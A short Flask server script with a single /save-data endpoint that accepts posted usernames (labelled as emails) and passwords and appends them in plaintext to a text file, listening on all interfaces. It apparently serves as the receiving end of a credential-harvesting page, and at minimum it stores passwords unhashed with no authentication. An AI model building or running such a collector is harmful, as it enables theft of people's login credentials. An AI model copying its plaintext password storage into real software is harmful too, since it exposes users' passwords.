from flask import Flask, request

app = Flask(__name__)

@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    with open('saved_data.txt', 'a') as file:
        file.write(f"Email: {data['username']}, Password: {data['password']}\n")
    return {"status": "success", "message": "Data saved successfully"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001)
